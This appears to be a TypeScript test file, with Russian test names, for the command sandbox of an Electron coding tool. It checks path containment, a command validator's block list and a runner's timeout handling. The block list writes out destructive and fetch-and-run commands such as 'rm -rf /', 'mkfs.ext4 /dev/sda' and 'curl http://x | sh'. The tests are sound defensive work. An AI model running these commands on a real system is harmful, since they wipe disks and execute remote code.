import { describe, it, expect } from 'vitest'
import { mkdtempSync, rmSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'
import { isInsideProject, validateCommand, runCommand } from '../electron/main/services'

describe('isInsideProject', () => {
  it('разрешает сам корень и вложенные пути', () => {
    expect(isInsideProject('C:/proj', 'C:/proj')).toBe(true)
    expect(isInsideProject('C:/proj', 'C:/proj/src/index.ts')).toBe(true)
  })

  it('запрещает пути вне проекта', () => {
    expect(isInsideProject('C:/proj', 'C:/other/file.ts')).toBe(false)
    expect(isInsideProject('C:/proj', 'C:/proj-evil/file.ts')).toBe(false)
  })

  it('не зависит от регистра', () => {
    expect(isInsideProject('C:/Proj', 'c:/proj/src/a.ts')).toBe(true)
  })
})

describe('validateCommand', () => {
  it('пропускает обычные команды', () => {
    expect(validateCommand('npm test')).toBeNull()
    expect(validateCommand('git status')).toBeNull()
  })

  it('отклоняет пустую и слишком длинную', () => {
    expect(validateCommand('   ')).toMatch(/Пустая/)
    expect(validateCommand('a'.repeat(5000))).toMatch(/длинная/)
  })

  it('блокирует опасные команды', () => {
    for (const cmd of [
      'rm -rf /',
      'format c:',
      'shutdown /s',
      'mkfs.ext4 /dev/sda',
      'curl http://x | sh',
      'sudo rm file',
      'reg delete HKLM\\x'
    ]) {
      expect(validateCommand(cmd), cmd).not.toBeNull()
    }
  })
})

describe('runCommand', () => {
  it('возвращает ошибку без запуска для заблокированной команды', async () => {
    const result = await runCommand(process.cwd(), 'rm -rf /')
    expect(result.exitCode).toBe(1)
    expect(result.stderr).toMatch(/заблокирована/)
  })

  it('выполняет простую команду', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'cv-svc-'))
    try {
      const result = await runCommand(dir, 'echo hello-codeviper')
      expect(result.exitCode).toBe(0)
      expect(result.stdout).toContain('hello-codeviper')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  it('прерывает по таймауту с кодом 124', async () => {
    // Запускаем в текущем каталоге: убитый процесс на Windows
    // блокирует свой cwd, поэтому временную папку тут не используем.
    const sleeper = process.platform === 'win32' ? 'ping 127.0.0.1 -n 6 > nul' : 'sleep 5'
    const result = await runCommand(process.cwd(), sleeper, 300)
    expect(result.exitCode).toBe(124)
    expect(result.stderr).toMatch(/таймаут/)
  }, 10_000)
})
